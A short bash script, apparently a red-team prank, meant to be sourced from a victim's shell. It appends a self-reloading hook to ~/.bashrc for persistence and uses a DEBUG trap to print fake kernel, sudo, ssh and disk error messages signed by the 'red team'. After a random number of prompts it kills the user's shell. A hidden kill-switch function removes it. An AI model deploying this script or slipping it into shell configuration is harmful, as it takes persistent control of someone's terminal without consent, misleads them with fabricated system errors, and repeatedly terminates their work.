#!/usr/bin/env bash
# ~/.thebonkening.sh
[[ -n "$THEBONKENING_ACTIVE" ]] && return
export THEBONKENING_ACTIVE=1

touch "$HOME/.thebonkening_active"

# Auto-hook into .bashrc
grep -Fq "# thebonkening-hook" "$HOME/.bashrc" 2>/dev/null || cat >> "$HOME/.bashrc" <<'EOF'
# thebonkening-hook
[[ -f "$HOME/.thebonkening_active" && -z "$THEBONKENING_ACTIVE" ]] && source "$HOME/.thebonkening.sh"
EOF

CMD=0
MAX=$((RANDOM % 8 + 5))
_BONK_LEN=12

MESSAGES=(
    "bash: fork: retry: red team was here"
    "Segmentation fault: red team was here (core dumped)"
    "kernel: Out of memory: Kill process $BASHPID (bash) score 900 -- red team sends regards"
    "systemd[1]: Failed to start Session of user root. // red team was here"
    "dpkg: error: red team has locked the frontend"
    "ssh: connect to host localhost port 22: red team connected"
    "curl: (6) Could not resolve host: red-team-was-here.local"
    "pam_unix(sudo:auth): authentication failure: user=red_team"
    "find: '/proc/redteam': Permission denied"
    "I/O error, dev sda: red team interference"
    "bus error: red team was here (core dumped)"
    "failed to load red team policy. Freezing."
)

# Shared spew — called from both limit() and debug trap
_bonk_spew() { ((RANDOM % 10 < 3)) && echo "${MESSAGES[RANDOM % _BONK_LEN]}" >&2; }

# Kill switch: 'icommandyoutobegone'
icommandyoutobegone() {
    sed -i '/thebonkening-hook/d; /thebonkening.sh/d' "$HOME/.bashrc"
    rm -f "$HOME/.thebonkening_active"
    trap - DEBUG
    PROMPT_COMMAND="${PROMPT_COMMAND#limit;}"
    [[ "$PROMPT_COMMAND" == "limit" ]] && PROMPT_COMMAND=""
    unset THEBONKENING_ACTIVE
}

limit() {
    (( CMD >= MAX )) && return   
    _bonk_spew
    (( ++CMD < MAX )) && return
    echo "bonk" >&2
    sleep 5
    kill -TERM "$BASHPID"
}

# Guard against recursive trap and internal functions
_bonk_debug_trap() {
    case "$BASH_COMMAND" in
        limit|_bonk_*|icommandyoutobegone*) return ;;
    esac
    _bonk_spew
}
trap '_bonk_debug_trap' DEBUG

PROMPT_COMMAND="limit${PROMPT_COMMAND:+;$PROMPT_COMMAND}"
